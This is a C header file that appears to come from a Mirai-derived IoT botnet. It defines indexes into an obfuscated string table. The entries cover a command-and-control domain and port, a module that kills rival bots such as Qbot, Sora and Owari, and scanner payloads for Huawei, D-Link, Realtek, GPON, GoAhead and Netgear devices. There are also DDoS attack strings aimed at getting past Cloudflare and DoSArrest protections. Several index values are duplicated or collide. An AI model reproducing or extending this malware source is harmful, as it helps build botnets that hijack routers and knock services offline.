#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};

//more misc stuff
#define TABLE_MISC_WATCHDOG 52
#define TABLE_MISC_WATCHDOG2 53
#define TABLE_MISC_WATCHDOG3 54
#define TABLE_MISC_WATCHDOG4 55

/* Generic bot info */
#define TABLE_PROCESS_ARGV              1
#define TABLE_EXEC_SUCCESS              2
#define TABLE_CNC_DOMAIN                3
#define TABLE_CNC_PORT                  4
          
/* Killer data */          
#define TABLE_KILLER_SAFE               5
#define TABLE_KILLER_PROC               6
#define TABLE_KILLER_EXE                7
#define TABLE_KILLER_DELETED            8   /* " (deleted)" */
#define TABLE_KILLER_FD                 9   /* "/fd" */
#define TABLE_KILLER_ANIME              10  /* .anime */
#define TABLE_KILLER_STATUS             11
#define TABLE_MEM_QBOT                  12
#define TABLE_MEM_QBOT3                 14
#define TABLE_MEM_UPX                   15
#define TABLE_MEM_ZOLLARD               16
#define TABLE_MEM_REMAITEN              17

// more killer data
#define TABLE_KILLER_MAPS 63
#define TABLE_KILLER_TCP 64
#define TABLE_MAPS_MIRAI 65
// bots kill
#define TABLE_EXEC_MIRAI 67
#define TABLE_EXEC_SORA1 68
#define TABLE_EXEC_SORA2 69
#define TABLE_EXEC_OWARI 70
#define TABLE_EXEC_JOSHO 71
#define TABLE_EXEC_APOLLO 72
#define TABLE_EXEC_ZONE 73
#define TABLE_EXEC_ZONE1 74
#define TABLE_EXEC_ZONE2 75
#define TABLE_MEM_ROUTE 76
#define TABLE_MEM_CPUINFO 77
#define TABLE_MEM_BOGO	78
#define TABLE_MEM_RC 79
#define TABLE_MEM_MASUTA1 80
#define TABLE_MEM_MASUTA2 81
#define TABLE_MEM_MIRAI1 82
#define TABLE_MEM_MIRAI2 83
#define TABLE_MEM_VAMP1 84
#define TABLE_MEM_VAMP2 85
#define TABLE_MEM_VAMP3 86
#define TABLE_MEM_KATRINA  87
#define TABLE_MEM_SHINTO3 88
#define TABLE_MEM_SHINTO5 89
#define	TABLE_MEM_JOSHO1 90
#define TABLE_MEM_JOSHO2 91
#define TABLE_MEM_IRC1	92
#define TABLE_MEM_QBOT1	93
#define TABLE_MEM_QBOT2	94
#define TABLE_MEM_IRC2	95
#define TABLE_MEM_CDN	96
#define	TABLE_MEM_MPSL	97
#define	TABLE_MEM_KATRINA2 98
#define	TABLE_MEM_JOSHO3 99
#define	TABLE_MEM_KATRINA3	100
#define	TABLE_MEM_OWARI1 101
#define	TABLE_MEM_OWARI2 102
#define	TABLE_MEM_OWARI3 103
#define	TABLE_MEM_MIRAI4 104
#define	TABLE_MEM_L7 105
#define	TABLE_MEM_WICKED 106
#define	TABLE_MEM_OWARI4 107
#define	TABLE_MEM_OWARI5 108
#define	TABLE_MEM_RANDOMIRC 109
#define	TABLE_MEM_RANDOMIRC1 110
#define	TABLE_MEM_RANDOMIRC2 111
#define TABLE_EXEC_PLEX2 112
#define TABLE_MEM_OWARI 113
#define TABLE_EXEC_MASUTA 114
#define TABLE_EXEC_LIGHTER 115
#define TABLE_EXEC_OWARI1 116    
#define TABLE_EXEC_JOSHO2 118  
#define TABLE_EXEC_OWARI2 119
#define TABLE_EXEC_SORA3 120
#define TABLE_EXEC_KATRINA6 121
/* Scanner data */          
#define TABLE_SCAN_CB_DOMAIN            18  /* domain to connect to */
#define TABLE_SCAN_CB_PORT              19  /* Port to connect to */
#define TABLE_SCAN_SHELL                20  /* 'shell' to enable shell access */
#define TABLE_SCAN_ENABLE               21  /* 'enable' to enable shell access */
#define TABLE_SCAN_SYSTEM               22  /* 'system' to enable shell access */
#define TABLE_SCAN_SH                   23  /* 'sh' to enable shell access */
#define TABLE_SCAN_QUERY                24  /* echo hex string to verify login */
#define TABLE_SCAN_RESP                 25  /* utf8 version of query string */
#define TABLE_SCAN_NCORRECT             26  /* 'ncorrect' to fast-check for invalid password */
#define TABLE_SCAN_PS                   27  /* "/bin/busybox ps" */
#define TABLE_SCAN_KILL_9               28  /* "/bin/busybox kill -9 " */

//encryption of the exploit scanners 
#define TABLE_SCAN_POST 56
#define TABLE_SCAN_CONTENTLEN 57
#define TABLE_SCAN_CONNECTION 58
#define TABLE_SCAN_ACCEPT 59
#define TABLE_SCAN_AUTH 60
#define TABLE_SCAN_HEADER 61
#define TABLE_SCAN_HEADER2 62
#define TABLE_SCAN_HUAWEI_ADRESS 119
#define TABLE_SCAN_DLINK_PAYLOAD 120
#define TABLE_SCAN_RELTEK_PAYLOAD 121
#define TABLE_SCAN_HNAP_PAYLOAD 122
#define TABLE_SCAN_GPON8080_PAYLOAD 123
#define TABLE_SCAN_GPON80_PAYLOAD 124

#define TABLE_GOAHEAD_1 137
#define TABLE_GOAHEAD_2 133 
#define TABLE_GOAHEAD_3 134
#define TABLE_GOAHEAD_4 135
#define TABLE_GOAHEAD_5 136
#define TABLE_GOAHEAD_6 137
#define TABLE_GOAHEAD_7 138
#define TABLE_GOAHEAD_8 139
#define TABLE_GOAHEAD_9 140
#define TABLE_GOAHEAD_10 141
#define TABLE_GOAHEAD_11 142
#define TABLE_GOAHEAD_12 143
#define TABLE_GOAHEAD_13 144
#define TABLE_GOAHEAD_14 155
#define TABLE_GOAHEAD_15 156
#define TABLE_SCAN_tr064_PAYLOAD 157
#define TABLE_SCAN_netgear_r7064_PAYLOAD 158

          
/* Attack strings */          
#define TABLE_ATK_VSE                   29  /* TSource Engine Query */
#define TABLE_ATK_RESOLVER              30  /* /etc/resolv.conf */
#define TABLE_ATK_NSERV                 31  /* "nameserver " */
// attack misc encryption storing 
#define TABLE_ATTACK_USERAGENT 125
#define TABLE_ATTACK_USERAGENT2 126

#define TABLE_ATK_HTTP 127
#define TABLE_ATK_USRAGENT 128
#define TABLE_ATK_HOST 129
#define TABLE_ATK_GET 130
#define TABLE_ATK_POST 131

// cloudflare 
#define TABLE_ATK_KEEP_ALIVE            32  /* "Connection: keep-alive" */
#define TABLE_ATK_ACCEPT                33  // "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8" // */
#define TABLE_ATK_ACCEPT_LNG            34  // "Accept-Language: en-US,en;q=0.8"
#define TABLE_ATK_CONTENT_TYPE          35  // "Content-Type: application/x-www-form-urlencoded"
#define TABLE_ATK_SET_COOKIE            36  // "setCookie('"
#define TABLE_ATK_REFRESH_HDR           37  // "refresh:"
#define TABLE_ATK_LOCATION_HDR          38  // "location:"
#define TABLE_ATK_SET_COOKIE_HDR        39  // "set-cookie:"
#define TABLE_ATK_CONTENT_LENGTH_HDR    40  // "content-length:"
#define TABLE_ATK_TRANSFER_ENCODING_HDR 41  // "transfer-encoding:"
#define TABLE_ATK_CHUNKED               42  // "chunked"
#define TABLE_ATK_KEEP_ALIVE_HDR        43  // "keep-alive"
#define TABLE_ATK_CONNECTION_HDR        44  // "connection:"
#define TABLE_ATK_DOSARREST             45  // "server: dosarrest"
#define TABLE_ATK_CLOUDFLARE_NGINX      46  // "server: cloudflare-nginx"

/* User agent strings */
#define TABLE_HTTP_ONE                  47  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_TWO                  48  /* "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_THREE                49  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36" */
#define TABLE_HTTP_FOUR                 50  /* "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36" */
#define TABLE_HTTP_FIVE                 51  /* "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7" */

#define TABLE_MAX_KEYS  159 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
